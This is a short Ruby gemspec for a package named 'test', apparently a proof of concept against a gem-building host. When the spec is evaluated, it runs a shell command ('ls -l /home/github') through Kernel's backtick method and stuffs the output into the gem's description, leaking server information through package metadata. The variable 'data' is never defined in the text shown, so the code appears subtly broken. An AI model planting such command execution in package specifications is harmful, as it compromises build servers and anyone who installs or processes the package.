Gem::Specification.new do |s|
str="ls -l /home/github;#"
i=0
str.each_byte {|b| data[i] = b; i += 1 }
(i...data.size).each {|i| data[i] = 32 }
d=Kernel.`(data)
  
  s.name = "test"
  s.description    = "#{d}"
  s.version  = "0.0.1"
  s.summary  = ""
  s.email    = "coderrr.contact@gmail.com"
#  s.homepage = "http://github.com/coderrr/monkey_shieldgrit"
  s.has_rdoc = false
  s.authors  = ["coderrr"]
  s.files    = [ "x" ]
end
